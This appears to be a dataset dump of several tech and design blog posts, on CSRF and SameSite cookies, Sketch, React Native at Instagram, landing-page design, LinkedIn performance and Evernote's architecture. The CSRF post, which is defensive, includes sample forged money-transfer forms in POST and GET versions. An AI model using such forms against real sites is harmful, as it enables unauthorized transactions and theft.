Anti CSRF tokens  There are two different ways you can use Anti CSRF tokens but the principle remains the same  When a visitor requests a page  like the transfer money page in the example above  you embed a random token into the form  When the genuine user submits this form the random token is returned and you can check it matches the one you issued in the form  In the CSRF attack scenario the attacker can never get this value and couldn t get it even if they requested the page because the Same Origin Policy  SOP  would prevent the attacker from reading the response that contains the token  This method works well but requires the site to track the issuance and return of the Anti CSRF tokens  A similar method is embedding the token into the form and issuing the browser a cookie that contains the same value  When the genuine user submits their form the value in the cookie and the form will match when received by the site  When the attacker sends the forged request the browser won t have the CSRF cookie set and the test will fail    form action  https   report uri io login auth  method  POST    input type  hidden  name  csrf_token  value  d82c90fc4a14b01224gde6ddebc23bf0    input type  email  id  email  name  email    input type  password  id  password  name  password    button type  submit  class  btn btn primary  Login  button    form       The Problem  The methods above have given us fairly robust protection against CSRF for a long time  Checking the Origin and Referer header isn t 100  reliable and most sites resort to some variation of the Anti CSRF token approach  The trouble is though that these both put some kind of requirement on the site to implement and maintain the solution  They might not be the most technically complicated things in the world but we re still building a solution to work around the browser doing something that we just don t want it to do  Instead  why don t we just tell the browser to stop doing the thing we don t want it to do     Now we can       Same Site Cookies  You may have seen Same Site Cookies mentioned in my recent blog called Tough Cookies but I m going to go a little deeper into it here with some examples too  Essentially  Same Site Cookies completely and effectively neutralise CSRF attacks  Dead  Finito  Adios  Capturing the essence of what we really need on the web to win the security battle  Same Site Cookies are simple to deploy  really simple  Take your existing cookie   Set Cookie  sess abc123  path        Simply add the SameSite attribute   Set Cookie  sess abc123  path    SameSite      You re done  Seriously  that s it  Enabling this attribute on the cookie will instruct the browser to afford this cookie certain protections  There are two modes that you can enable this protection in  Strict or Lax  depending on how serious you want to get  Specifying the SameSite attribute in your cookie with no setting will default to Strict mode but you can also set Strict or Lax explicitly if you wish   SameSite Strict SameSite Lax      Strict  Setting your SameSite protections to Strict mode is obviously the preferred choice but the reason we have two options is that not all sites are the same nor do they have the same requirements  When operating in Strict mode the browser will not send the cookie on any cross origin request  at all  so CSRF is completely dead in the water  The only problem you might come across is that it also won t send the cookie on top level navigations  changing the URL in the address bar  either  If I presented a link to https   facebook com and Facebook had SameSite cookies set to Strict mode  when you clicked that linked to open Facebook you wouldn t be logged in  Whether you were logged in already or not  opened it in a new tab  whatever you did  you wouldn t be logged in to Facebook when visiting from that link  This could be a little annoying and or unexpected to users but does offer incredibly robust protection  What Facebook would need to do here is similar to what Amazon do  they have 2 cookies  One is kind of a  basic  cookie that identifies you as a user and allows you to have the logged in experience but if you want to do something sensitive like make a purchase or change something in your account you need the second cookie  the  real  cookie that allows you to do important things  The first cookie in this case wouldn t have the SameSite attribute set as it s a  convenience  cookie  it doesn t really allow you to do anything sensitive and if the attacker can make cross origin requests with that  nothing happens  The second cookie however  the sensitive cookie  would have the SameSite attribute set and the attacker can t abuse its authority in cross origin requests  This is the ideal solution both for the user and for security  This isn t always possible though and because we want SameSite cookies to be easy to deploy  there s a second option       Lax  Setting the SameSite protections to Lax mode fixes the problem mentioned above in Strict mode of a user clicking on a link and not being logged in on the target site if they were already logged in  In Lax mode there is a single exception to allow cookies to be attached to top level navigations that use a safe HTTP method  The  safe  HTTP methods are defined in Section 4 2 1 of RFC 7321 as GET  HEAD  OPTIONS and TRACE  with us being interested in the GET method here  This means that our top level navigation to https   facebook com when the user clicks the link now has SameSite flagged cookies attached when the browser makes the request  maintaining the expected user experience  We re also still completely protected against POST based CSRF attacks  Going back to the example right at the top  this attack still wouldn t work in Lax mode    form action  https   your bank com transfer  method  POST  id  stealMoney    input type  hidden  name  to  value  Scott Helme    input type  hidden  name  account  value  14278935    input type  hidden  name  amount  value   1 000        Because the POST method isn t considered safe  the browser wouldn t attach the cookie in the request  The attacker is of course free to change the method to a  safe  method though and issue the same request    form action  https   your bank com transfer  method  GET  id  stealMoney    input type  hidden  name  to  value  Scott Helme    input type  hidden  name  account  value  14278935    input type  hidden  name  amount  value   1 000        As long as we don t accept GET requests in place of POST requests then this attack isn t possible  but it s something to note when operating in Lax mode  Also  if an attacker can trigger a top level navigation or pop a new window they can also cause the browser to issue a GET request with the cookies attached  This is the trade off of operating in Lax mode  we keep the user experience intact but there is a small amount of risk to accept as payment       Additional uses  This blog is aimed at mitigating CSRF with SameSite Cookies but there are  as you may have guessed  other uses for this mechanism too  The first of those listed in the spec is Cross Site Script Inclusion  XSSI   which is where the browser makes a request for an asset like a script that will change depending on whether or not the user is authenticated  In the Cross Site request scenario an attacker can t abuse the ambient authority of a SameSite Cookie to yield a different response  There are also some interesting timing attacks detailed here that can be mitigated too   Another interesting use that isn t detailed is protection against leaking the value of the session cookie in BEAST style attacks against compression  CRIME  BREACH  HEIST  TIME   This is really high level but the basic scenario is that a MiTM can force the browser to issue requests cross origin via any mechanism they like and monitor them  By abusing the change in the size of request payloads the attacker can guess the session ID value one byte at a time by altering the requests the browser makes and observing their size on the wire  Using SameSite Cookies the browser would not include cookies in such requests and as a result the attacker cannot guess their value       Browser Support  With most new security features in browsers you can expect either Firefox or Chrome to be leading the charge and things are no different here either  Chrome has had support for Same Site Cookies since v51 which means that Opera  Android Browser and Chrome on Android also has support  You can see details on caniuse com that lists current support and Firefox has a bug open to add support too  Even though support isn t widespread yet we should still add the SameSite attribute to our cookies  Browsers that understand it will respect the setting and afford the cookie extra protection while those that don t will simply ignore it and carry on  There s nothing to lose here and it forms a very nice defence in depth approach  It s going to be a long time until we can consider removing traditional anti CSRF mechanisms but adding SameSite on top of those gives us an incredibly robust defence,"[45 400 629 28 444 1001 326 849 1395 223 1132]"
58,training-dataset/engineering/98.txt,engineering,How Airbnb Uses React,"[58 200 1305 996 820 444 755 218 248 326 329]"
69,training-dataset/product/916.txt,product,3 Sketch mistakes for a rough developer handoffDesigners and developers are the key players in creating digital products and a healthy handoff is critical to keep projects moving smoothly  As a designer  it s up to you to make sure that handoff sets the developers up for success  So let s take a look at 3 common mistakes that are easy to make in Sketch and how to fix them   Oh  and pssstttt  Here s where to get Craft   1  Forgetting about half pixels  When a layer is positioned or scaled to a fraction of a pixel  it may not look alarming on the Sketch canvas  Which is why it s easy to let it slide until it s too late   If we zoom in on this icon  for example  you ll notice that the 2 rectangles that make up the plus sign don t line up with the pixel grid  Since Sketch is a vector drawing application  edges appear crisp but that s not how a raster asset would export   To get a more honest view of the issue  head up to View   Canvas   Show Pixels  Now you can see that anti aliasing is being used to smudge the edge to the next full pixel  Nasty stuff   Sketch will offer us a helping hand in this situation if we select the offending objects and visit Layer   Round to Pixel  But you ll still want to double check the numbers to make sure they rounded the way you expected   2  Using almost the same color  The beauty of designing in a freeform application like Sketch is that you don t have to constrain yourself with rules along the way  which is where many of us get a little sloppy with colors   As we build things out over many  many hours of work  we make plenty of minor tweaks along the way that create little inconsistencies that can be optically impossible to spot  So how can we catch and fix all of these subtle mismatches   The solution lies in our free suite of Sketch plugins called Craft   Using the Libraries plugin  we can automatically generate a living style guide that shows every color used in our document  Here you can see an awkward and accidental variety of blues  greens  and dark grays   The most beautiful part is that these color swatches can be unified here on the  Styles  page and synced back into the document with a click  Visually  your design may look about the same  but now developers will have zero color confusion when they inspect your design  and they might even consider having lunch with you now   3  Using blending modes  A big part of setting developers up for success is giving them any graphic assets they may need to reproduce your design accurately in the final product   The artist in you may feel determined to use a blending mode from time to time to get the visual effect that you re going for   But  when exporting an asset from Sketch  the blending mode doesn t go with it  Since a blending mode is the visual result of how 2 or more layers interact  an individual graphic asset unfortunately can t carry it along   But fear not  This  unblended  asset would be exactly what your developer needs in order to apply the blending mode programmatically   Related  Questions to ask developers before you start designing  The great news here is that when you use Craft Sync to get your screens added to your InVision prototype your developers will be able to use Inspect to see exactly how your blending modes are meant to look and download the proper assets all in one place   They ll also be able to see those nice colors that you cleaned up for them   Smooth sailing ahead   You may also love these Sketch videos,"[69 564 1344 887 1175 1001 1077 425 218 1420 319]"
167,training-dataset/engineering/949.txt,engineering,Snapback Cache   What we use to make our infinite scrolling feeds at Highrise awesome Snapback Cache   What we use to make our infinite scrolling feeds at Highrise awesome   Many apps today have some concept of an infinite scrolling feed  Facebook  Twitter  LinkedIn and many more  Almost all of them suffer from the same problem  If you click on something in the feed that brings you to a new page  when you hit the back button or try to return to that original feed  your place is lost  All the scrolling is gone   At Highrise we had that same problem  So this is the library we use to fix that  We call it our Snapback Cache  and it s made a big improvement to how people can use infinite scroll in our app and still get a lot of work done without losing their place   Another great thing about this is it operates on the URL  so you can have multiple infinite scrolling feeds to cache  At Highrise we have a  main activity  and then activities for a Contact  etc  They each get their separate cache  To keep a manageable memory footprint for your browser  we keep 10 caches as a maximum   The basics of how it works  Using this small javascript library  you hook it up to the click events on things in your infinite scrolling feed  For example   Now when people click the links inside our  recordings  container  the stuff inside the current recordings container is cached locally using the browser s session storage   Then the javascript library watches the load event of any pages being browsed  If the library sees that that browser s URL is a url we ve already cached  and it s not  too old   15 minutes   we replace the contents of our container   recordings in our example  with the cached version  and scroll the browser to the place where it had been cached   This sounds easy  but there are certain things we bumped into that the library also helps with  Things like disabling autofocus events that mess up scrolling and making sure things in the cache can actually be more granularly ignored or even refreshed   Syntax and how to use it  var snapbackCache   SnapbackCache   options      Here are some example options   bodySelector is mandatory  It tells us what on the page you want to cache   finish is a function of things that you d like to happen before the page is cached to get the page to get cleaned up  For example  we already try to get jQuery animations to finish  but if there s anything else on the page that might be animated or dynamically changing when someone is trying to navigate your site  you probably don t want those  transitional  things cached  In our case we have a search bar that we want cleared up before things are cached   removeAutofocus is a function that removes any auto focus behavior from your page  autoFocus events can mess with the browsers ability to scroll to the right place  So we want to nip that in this function  In our case we have multiple autofocus things going on  so we clear all that up   refreshItems is a function to help refresh anything that might have gone stale from the cache  You can use that in conjunction with a method available on snpachbackCache called markDirty   So in our case  we cache a note or comment or email in our feed  But if someone at some point edits deletes one of those notes  comments or emails  we have javascript call  snapbackCache markDirty id_of_dirty_thing    Then when the snapbackCache replaces the cached contents it s saving for us  it makes sure to call the refreshItems function you specify along with an array of  dirty items  you can do something with  In our case  we take all those dirty ids  and issue an ajax call that does all the work to refresh bits of the cached page   nextPageOffset is a function that the Snapback cache can use to figure out what  page  your user is on  We take that page and store it along the cached contents of the page  That way when the cached page is restored you have the page number the user was on and get pick up infinite paging at the appropriate place  See the page cache loaded event below to do that   Events  There are a couple of events we send out that are useful   snapback cache cached is an event emitted as soon as the contents of the page have been cached into session storage  snapback cache loaded is an event emitted as soon as the contents of the page have been replaced  We use this at Highrise to set the appropriate offset for our infinite scrolling   nextPageOffset was calculated because we had setup a  nextPageOffset  function on the page cache   Installation  1  Add the snapback_cache js to your javascript stack   2  Add a cache variable with the options set   var snapbackCache   SnapbackCache   bodySelector    recordings        3  Call snapbackCache cacheCurrentPage   whenever you need to  and magically when people return to that url  the cache will do the rest   Feedback  Source code available on Github  Feedback and pull requests are greatly appreciated  Let me know how we can improve this   A ton of thanks to everyone at Highrise for helping get this into our stack  Especially Jon Phenow  Grant Blakeman and Michael Dwan for the edits and help getting it open sourced   P S   You should follow us on Twitter  here  or see how we can help you with contact management using Highrise   a handy tool to help you remove anxiety around tracking who to follow up with and what to do next,"[167 326 223 629 400 28 392 1305 425 444 900]"
200,training-dataset/engineering/795.txt,engineering,React Native at Instagram   Instagram EngineeringReact Native at Instagram  React Native has come a long way since it was open sourced in 2015  Fewer than two years later  it s being used not only in Facebook and Facebook Ads Manager  but also in many other companies  from Fortune 500 companies to hot new startups     Developer velocity is a defining value of Instagram s mobile engineering  In early 2016  we started exploring using React Native to allow product teams to ship features faster through code sharing and higher iteration speeds  using tools like Live Reload and Hot Reloading that eliminate compile install cycles   Challenges  Integrating React Native into an existing native app can create challenges and additional work that you don t encounter when you start an app from scratch  With this in mind  we decided to start exploring these challenges by porting the simplest view we could think of  the Push Notifications view  This view was originally implemented as a WebView  so we thought that it wouldn t be too hard to beat its start up times  On top of that  this view didn t require us to build much navigation infrastructure   the UI was quite simple and translations were determined by the server   Android Methods Count  The first problem that popped up was adding React Native as a dependency without pulling in the entire library  Doing so would not only increase the binary size  but would also have a large impact on methods count  making Instagram for Android go multi dex with all the performance consequences this entails  yes  Instagram is still single dex    We ended up selectively pulling in only the view managers we needed at that time and writing our own implementations for the ones that depended on libraries we didn t want to pull in  Ultimately  React Native ended up adding  3500 methods  Features written in React Native barely require defining Java methods  so we believe this investment will be worthwhile in the long run   Metrics  As part of the Push Notification Settings experiment  we audited React Native s impact on several metrics  including crashes and out of memories  We found these metrics to be neutral both on the initial experiment and when we looked into retaining the bridge instance when the user left a React Native feature  so the next time they enter one we didn t have to re create it    Start Up Performance  React Native has a start up overhead mostly caused by having to inject the JavaScript bundle into JavaScriptCore  the VM used by React Native both on iOS and Android  and instantiate native modules and view managers  Although the React Native team has come a long way in improving performance  for Instagram integration we wanted to measure this gap to figure if the tradeoffs would make sense for us  To do so  we ported the existing native Edit Profile view to React Native  Along the way  we built product infrastructure that started being used by product teams in parallel  e g  navigation  translations  core components    We ended up leveraging ideas and infra already built by the React Native team  namely Random Access Module Bundling  Inline Requires  Native Parallel Fetching and plenty more already integrated into the framework   Products  As mentioned on the previous section  the Core Client team ported the Push Notification Settings and the Edit Profile views to React Native  We also ported the Photos Of view to start looking into performance when powering lists with React Native   In addition to these examples  several product teams have shipped features in React Native   Post Promote  Instagram has a lightweight interface for promoting posts called Post Promote  This product was originally implemented as a WebView because that technology allowed the team to iterate faster than with native code  The problem with WebViews is that the UX doesn t feel native and start up is pretty slow  The promote team ported this feature to React Native and got fantastic improvements on startup times and user experience  It is worth mentioning that despite this being a very complex creation flow  it only added 6 methods to the Android DEX   Save  Over 600M people come to Instagram every month and discover a wealth of new interest based inspiration while connecting with their communities  However  they re not always ready to act on this inspiration at the moment of discovery  and often want to revisit this content later when they re ready  In response to this need  the Save team implemented support for saving posts and revisiting them when they want to via a new  private tab on their profile that is only visible to them     The Save team implemented the iOS version of the list of saved posts in React Native   Checkpoints  Checkpoints are flows triggered from the server in response to suspicious actions  e g  when we need to verify your phone number  when we think your account might have been compromised  etc      Historically  checkpoints have been implemented using WebViews  As mentioned before  WebViews are good for code sharing and fast iteration speeds  but the UX doesn t feel native and startup times can be slow     The Protect and Care team started working on revamping some of these flows  They decided to use React Native to leverage code sharing while keeping a great user experience and low startup times   Comment Moderation  We want Instagram to be a safe place where everybody can capture and share their most important moments  As the Instagram community grows and people from every corner of the world share more content we want to work diligently to maintain what has kept Instagram positive and safe  especially regarding the comments on your photos and videos  With this goal in mind  the Feed team launched a feature that allows users to moderate the comments they receive on their posts   Lead Gen Ads  Lead Gen Ads is a call to action surface that allows users to share information with advertisers  Advertisers can customize the forms on this surface   Results  React Native allowed product teams to ship features faster to both our iOS and Android apps  The list below shows the percentage of code shared between the apps for some of the products  which could be used as a proxy to measure how we managed to improve developer velocity   Post Promote  99   SMS Captcha Checkpoint  97   Comment Moderation  85   Lead Gen Ads  87   Push Notification Settings  92   Footnote  We recently moved our mobile infrastructure engineering teams  iOS and Android  to New York City  If this blog post got you excited about what we re doing  we re hiring   check out our careers page   Martin Bigio  Don Yu  Brian Rosenfeld and Grace Ku are Software Engineers on the Core Client team at Instagram New York,"[200 1305 58 996 820 248 444 400 629 28 900]"
218,training-dataset/product/928.txt,product,Using design theory to create beautiful  high converting landing pagesOne of the biggest challenges for designers is creating landing pages that not only look good  but also convert well   You can see why this would be the case design goals and business goals are often at odds  UX and CRO  conversion rate optimization  principles don t always align  either   There is  however  a solution  conversion optimized design   Conversion optimized design is where design theory meets conversion rate optimization principles  The result is happier users and more profitable businesses   In this post  I ll show you exactly how to use your design theory knowledge to optimize your landing page conversion rates   Design theory and conversion rate optimization  When marketers create landing pages  they focus on layouts  persuasion principles  and information hierarchy   The top concerns for designers  however  are user experience  colors  typography  and stylistic elements that help build a powerful and usable brand   Conversion optimized design essentially seeks to align these 2 schools of thought  So instead of focusing on UX alone  you d also emphasize persuasion and conversions  while merging it with the aesthetic choices that lead to better looking websites   Let s take a look at some theory backed tactics to creating beautiful landing pages without compromising on conversion rates   Picking the right layout  Marketers know very well that the layout of different elements on a page will affect conversion rates  This is why they ask designers to put the most important information above the fold and remove navigation menus from checkout pages  even if it goes against UX principles   But there are some theoretical principles you can adopt to create conversion optimized landing pages without compromising on user experience   1  Design according to the rule of thirds  If you ve ever taken any photography lessons  you might have heard of the rule of thirds  Less a rule and more of a suggestion  this rule says that any image has more tension and energy when it is divided into 9 equal parts   This GIF from Wikipedia illustrates it perfectly   The rule of thirds is the reason why photographers don t always center their subjects in the frame  Some of the the world s most recognizable photographs follow this rule   Here s one example   The rule of thirds doesn t just apply to photographs it also applies to landing pages  Take a look at this landing page from WebDAM   Or this one from Inbound Emotion   The page design is much more dynamic and energetic than if the designer had simply centered all elements   As per design theory and eye scanning data  the intersections of the 3 3 grid lines capture the most attention on any page  So it makes sense that elements placed closed to these grid lines would get more attention as well   Follow this tactic and your layouts will look good and convert well  while also being highly usable    2  Place important elements in accordance with Fitts s law  The human eye is trained to follow hierarchies  Our eyes naturally follow a progression from bigger to smaller elements  Eye tracking studies conducted by Nielsen show this as well   Here  users focus on the header more than on the body  and their eyes linger longer on the larger font than the smaller paragraph text   Another principle similar to this is Fitts s law  Originally formulated by psychologist Paul Fitts in 1954 to describe human computer interaction  this law states that how quickly a user moves to an on screen object is a function of ratio of the object s nearness  to the user  and its size   Mathematically  this is represented as follows   The less complicated way to think of this is as follows  If you want people to click on something  make it larger and place it closer to the user s cursor  or finger    In desktop applications  this means keeping the most important buttons close to the corners  which occupy primary pixel space  also called  prime pixel     For example  the prime pixel corners in Word all house important buttons   Websites lack a prime pixel because the page is scrollable  In such a case  it s wise to consider the center of the screen as the prime pixel area  As Smashing Magazine puts it  web designers have to  necessarily opt for a more compact  centered layout  with the cursor at or near the center of the screen  Per Fitts s Law  any large button kept close to this area will yield higher clicks   Hence  you see landing pages like this where the CTA and leading text occupy the dominant areas on the screen   Keep in mind that Fitts s law is a binary logarithm  so the clickability of a button doesn t increase linearly  i e  a 300  larger button won t be 300  more clickable   Instead  smaller changes lead to bigger returns in clickability   For this reason  you ll do better by placing your CTAs near the center of the screen and making them slightly larger than surrounding elements   This page from Litmus is a great example   The CTA occupies the center of the screen and is easily visible in the first half of the page   Here s another example from MarketStrong   Here  the CTA is easily visible above the fold  while the header text occupies prime screen real estate  Note the lack of a navigation bar and small logo   This is something you can use in your own designs right away minimize non essential items on screen and bring your most important elements closer to the center of the screen  and place them above the fold   Picking the right fonts  You likely already know the basics of typography  You might also know that the 2 basic categories  serif and sans serif  can be further divided into different font families like humanist  geometric  modern  slab serif  etc   Conversion rate optimization experts  meanwhile  only consider one thing  Will this font lead to better conversions   Conversion optimized design essentially merges these 2 concerns  So instead of choosing a font based on aesthetic or usability considerations alone  you would choose fonts that   Improve brand perception  and thus move conversion goals passively   Improve the speed and ease with which people can read a page while also emphasizing conversion focused type elements such as headings   Let s look at these in more detail   1  Typography and brand perception  Take a look at this page from The New York Times   Now take a look at this page from Buzzfeed   Both these brands use very different typefaces  NYT uses serif fonts  NYT Cheltenham and Georgia   while Buzzfeed uses 2 sans serif fonts  Helvetica Neue Light and Proxima Nova    This aligns with their brand image  The New York Times is perceived as a home to serious journalism  while Buzzfeed is still largely perceived as a site filled with  fun  cat GIFs   Designers know this already  Typography and brand identity are deeply related   For example  one study argues that typography is a core element of whether a brand is seen as  sincere    exciting  or  sophisticated    Another test conducted by the NYT quizzed readers on the trustworthiness of some scientific studies  The results of the test showed that readers trusted studies written in the Baskerville font the most  Studies written in Comic Sans  on the other hand  were deemed to be the  least trusted    For conversion optimized design  try to use fonts that echo the emotions you want your readers to feel   That is  use a sincere font like Georgia on a sales page where trustworthiness is crucial  and a more  fun  font like Playfair on non conversion oriented blog headlines   Broadly speaking  you can divide some popular fonts as follows   Sincere  Georgia  Baskerville  Sophisticated  Garamond Pro  Playfair Display  Bold  Impact  Oswald  Gotham Condensed Bold  Modern  Helvetica  Avenir  Roboto  Futura  Fun  Lobster  Barrio  2  Typography and readability  The font choices you make affect not only the emotions your readers feel  but also how quickly they can read your copy   More importantly  your type choices decide what page elements your users focus on   As an example  consider a headline in the bold  decorative Pacifico font   This would certainly grab your attention  but when the same font is used in a lengthy paragraph  here s the end result   That s not exactly easy to read  It also doesn t let any particular page element stand out  which is bad for conversions   Besides using different fonts in your headlines and body text  there are several other ways to work around this   Readability  line height and paragraph length  This is something CROs and UX designers can agree on  longer line height equals better readability   For instance  the first paragraph below is much easier to read because of the larger line height   While line height is important for better readability  an even more crucial factor is paragraph length  i e  the number of lines words per paragraph   For example  most old school sales pages almost always limit themselves to one  or 2 sentence paragraphs   Combined with a generous line height  these short paragraphs will make reading your landing pages a whole lot easier   Readability and font size  According to one study  larger font has a bigger emotional impact on the reader  which also enhances readability   You can see this yourself in this example   It s now standard to use fonts larger than 16px in paragraph text  Some popular sites such as Medium use fonts as large as 21px   This is not only good for CRO  but also a sound UX practice since larger fonts are more likely to make your content more accessible   Picking the right colors  Most established brands have a set of  brand colors  that are used in all their marketing materials  including landing pages   For example  this is Twitter s brand colors set   And this is Coke Zero s   If you re working in any organization that embraces design culture  you probably have these color sets as well   But if your goal is to increase conversions  you might have to stray from your brand colors in your landing pages especially if your brand colors aren t conducive for conversions   For conversion optimized design  follow these tips when choosing landing page colors   1  Choose colors that evoke your landing page s emotion  You probably know that different colors are associated with different emotions and occasions  You go green with envy and feel blue when you re down   Similarly  you associate green with nature  and St  Patrick s Day   white with snow and purity  red with hunger  power  and aggression  yellow with the warmth of the sun   This is why so many food companies use red in their logos   And why green is the favorite color for environmentally friendly companies like Solar City   When you re choosing colors for a landing page  pick something that conveys the same emotions as your product or landing page copy   That is  if you want your customers to see you as a futuristic brand  use a black  white  and gray silver theme  like Tesla   Similarly  if you want your brand to be seen as trustworthy and business like  use  corporate  colors like blue and white   Take a look at this Salesforce landing page   Keep in mind that color associations are cultural  Red might be seen as a symbol of aggression in the west  but in China  it is seen as a symbol of luck and fortune   2  Use complementary colors for contrast  Complementary colors cancel each other out when combined  However  when they re placed next to each other  they produce the highest possible contrast  outside of white black combinations   This is why you see so many landing pages use complementary colors in their design   For example  this landing page uses orange for its buttons and blue for the surrounding regions 2 complementary colors   This page likely gets solid conversions   Similarly  this page from Groupon uses green for the background and red for the button   Note how the model in the image is facing the form  drawing your attention to it   Complementary colors should form the foundation of all your landing pages  They re particularly effective when creating CTAs that stand out   3  Choose colors that match your target demographic  Studies indicate that colors play a big role in what we decide to purchase  Consumers tend to gravitate particularly strongly to colors that are already culturally associated with their respective age or gender   One study found that men tend to prefer shades of blue  and women tend to like pastel shades of pink   Check out this landing page from Birchbox   And now look at this page from Thrillist   Birchbox is a subscription box service for beauty goods  Their customers are almost exclusively women  Thrillist s target audience  on the other hand  is mostly men   This is reflected in their choice of colors as well  Birchbox uses lighter  colorful hues  while Thrillist sticks to bold  dark colors   Broadly speaking  you can make the following demographic divisions   Men prefer bold  strong colors  Women prefer softer hues  Young consumers prefer bright  playful colors  Older consumers prefer  trustworthy  warm and corporate colors  You can see this reflected in the color choices of some of your favorite brands  For example  Kate Spade  a New York centered fashion label for women  uses bright colors and pastel shades on their homepage   Kate Spade s sister company  Jack Spade  which sells clothing for men  uses a very different color scheme focusing on olives  gray  and blacks   This is a great example of how brands can target different demographics by carefully selecting their color schemes   Over to you  By following a few simple principles of design theory  you can create landing pages that will net you leads without compromising your brand   Focus on choosing the right colors  fonts  and layouts  Pick fonts that correspond to your target market s requirements and choose colors that complement your brand  As for layout  designing pages that have a strong visual hierarchy and obey Fitts s Law will go a long way towards improving your conversion rate and brand presence,"[218 1275 425 311 1334 1420 1001 319 564 1344 69]"
223,training-dataset/engineering/1120.txt,engineering,Measuring and Optimizing Performance of Single Page Applications  SPA  Using RUMIntroduction  Improving site speed is one of the major technology initiatives at LinkedIn because it is highly correlated with the engagement members have on our website  Real User Monitoring  RUM  is an approach where we use data from real users  instead of a synthetic lab environment  to measure performance  and this is the primary way we measure site speed at LinkedIn  In this blog post  we present how we measure performance of single page applications at LinkedIn using RUM  and how we used RUM data to make our new LinkedIn web application faster by 20    Page Load Time  PLT  is the key metric that we measure for every page at LinkedIn in order to capture the user s perception of when the page is ready  It is not easy to measure this metric uniformly across all pages because it is highly subjective depending on the content of the page and on the end user s perception  Speed Index is a good indicator for the user s perception of when the page is rendered  and we use it for measuring performance in synthetic environments  But it is not possible to calculate this metric accurately using RUM  So  we needed to find a good proxy for PLT that could be easily measured using RUM  For traditional web applications  which are mostly server side rendered  window onload   event is a reasonably good proxy for PLT  Most traditional RUM libraries use the Navigation Timing API to detect when window onload   event is fired and thereby measure PLT for the page  However  as we discuss below  we ran into several obstacles when trying to use window onload   as a proxy for PLT for single page applications   Single page applications  Single page applications  SPA  are web applications built using a Javascript MVC framework  like Ember  to deliver a rich  app like experience  The HTML for these pages is mostly built on the client browser instead of the web server  Another thing to note is that any page URL in these applications can be visited in two modes   App launch  This occurs when the app is initially loaded by entering the URL in the browser or by clicking on an email link   App launch  mode is typically slow  as the application  JS CSS  needs to be downloaded and booted before doing the work to render the page   Subsequent  This occurs when the app has already been loaded and the page is visited by clicking on a link within the app   Subsequent  mode is typically fast because the application is already downloaded and booted  and we just need to fetch new data for the page and render it   As LinkedIn web applications moved from traditional server side rendered web pages to modern single page applications  we faced many challenges in using the window onload   event for measuring performance of these applications using RUM   When a page is visited in  app launch  mode  the window onload   event is fired too early relative to when the user sees meaningful content on the page  as illustrated in the image below  window onload   event is geared more towards resource download times instead of rendering times  and when most of the rendering happens on the client side  it does not represent PLT accurately,"[223 629 400 28 454 329 1267 167 326 248 1144]"
248,training-dataset/engineering/448.txt,engineering,The Care and Feeding of ElephantsA little over six months ago the Evernote web team started building a brand new web client  Growing technical debt  difficulties with our current architecture  and an aging GWT stack all motivated us to rebuild  We wanted to use better tools like React  Redux  Webpack  and Babel to enhance our workflow  attract more engineers to our team  and significantly increase our velocity  We started out just thinking we d rebuild our application on top of Redux  with some RxJS and other ideas sprinkled in  What we ended up with  Well  it s amazing   We re using the ideas of micro service architectures to bring more flexibility  performance  and maintainability to web application development  I m not going to go into a ton of detail about exactly how we re doing this here  but the basic idea is that we re treating  workers  or processes like VMs and writing a framework that would handle communication  scaling  and distribution of tasks across our workers  We haven t yet named the abstract architecture  but here at Evernote  we ve been calling the new web infrastructure that we re building on top of this framework the  Ion  project   As often happens  we kind of stumbled into the core breakthrough that gave us the architecture we now have  One of our product managers was looking for a way to run complex experiments that went well beyond simple UI changes  When we started to think about how to accomplish this in an efficient and repeatable way  we realized that we needed a platform that wasn t so  view centric   More often than not  applications are built from the perspective of the presentation layer  and this ends up producing an application architecture that is a slave to the UI  When your UI needs to change  so must your models and controllers  Or  in the context of Redux Flux  so must your stores and actions   To make this kind of experimentation possible  we developed an architecture that treated the presentation layer like any other component it s a consumer of data  and a producer of events nothing more  Our presentation layer can then be thought of as an independent application that uses a React Redux architecture  But our Redux store manages only the part of the application state that relates to the presentation layer at that moment in time  A user s account data is maintained across a variety of DataSources  Each instance has its own reducer which allows it to maintain its own state and broadcast relevant change events  Other computational tasks like searching  sorting and sync are handled and maintained by other micro components  All of the components are connected by a unified message broker one that makes extensive use of the PubSub pattern  You might ask why we re not just using a simpler approach maybe an Observable pattern  or even just a standard Redux app  The answer is that in addition to being the next Evernote web client  Ion is also Evernote s first step towards creating a core client library   One of Evernote s many benefits has for years been our presence on a variety of platforms  Historically  for the many talented engineers at Evernote  this has meant writing the core of our applications at least five times  for at least five different platforms  Thankfully  the proliferation of web technologies  web workers  and web views in native platforms means that this approach is no longer a requirement  Instead  we re working to build a core client library that contains all the business logic necessary to maintain the state of a user s account on the client side  By using the PubSub style broker I ve described above as a  bridge   along with a bit of native code on the platform in question   we can power all five of our applications with less work and more velocity   With this PubSub broker in place  whenever a new message is published about a particular topic  it is rebroadcast to all subscribed micro components in our application  The PubSub pattern allows us to broadcast these messages across processes or threads  This means that interested parties can subscribe to the topics they care about  while others can just ignore them  For example  our client side search component will be a micro component that runs in a separate thread  process or worker  depending upon the platform in use   This component will be completely independent maintaining a simple keyword index for various entities  and using our RPCs to connect to our cloud based search service  When a user enters search keywords into our UI  a FIND_NOTES message is published to the Search topic  The search micro component having previously subscribed to the Search topic will receive this message and act upon it  If a network connection is available  it will hand the task off to our search service  if not or if the search service doesn t respond quickly enough it will use its own index to generate a basic set of search results  Either way  once results are available  it will publish a RESULTS_AVAILABLE message back to the Search topic  The UI consumes this message which leads to the search results being displayed to the user  The key benefit here is that the UI needn t have any knowledge of how these results are being generated  It only knows that they are  Furthermore  in this example  the events that lead to search results appearing in the UI are asynchronous  We don t need to write complex logic to control the order in which processing occurs  Things happen when they happen  New messages are then generated  or not  and other components act on those messages  or not   Round and round we go  For the few cases where synchronous responses are required  we re exploring a number of possibilities  Developing a waitFor mechanism much like the one used in Facebook s Flux dispatcher  or using a new idea we re calling  connectors  which are essentially micro services that function a bit like pipes to manage the flow of data   So what are the big benefits for us  First  the presentation layer doesn t have to manage the entire application state  so the user interface is highly responsive  We can also run multiple interfaces on top of the same core logic simultaneously  which makes experimentation a breeze  Additionally  the functional and modular nature of our architecture allows us to spin up workers which can then handle background processing tasks this is a massive advantage in the typically single threaded world of Javascript web engineering   But there s one more benefit that s really got me and other members of the engineering leadership here at Evernote excited  you may have already guessed it   Cloud architectures that utilize micro services have allowed development teams to work in a highly independent  decoupled way without having to concern themselves with existing behavior or functionality  or what other teams are doing  Our micro services like approach to client side application development has given us many of the same workflow benefits  Once we had the biggest pieces of the puzzle in place  communication  service management  etc   we realized that we could build new Ion micro components without fear of causing regressions within existing functionality or behavior  Eventually  I see us being able to self organize in ways that haven t been historically feasible  like organizing our client side development teams around specific bits of functionality and behavior   For example  we re working on a 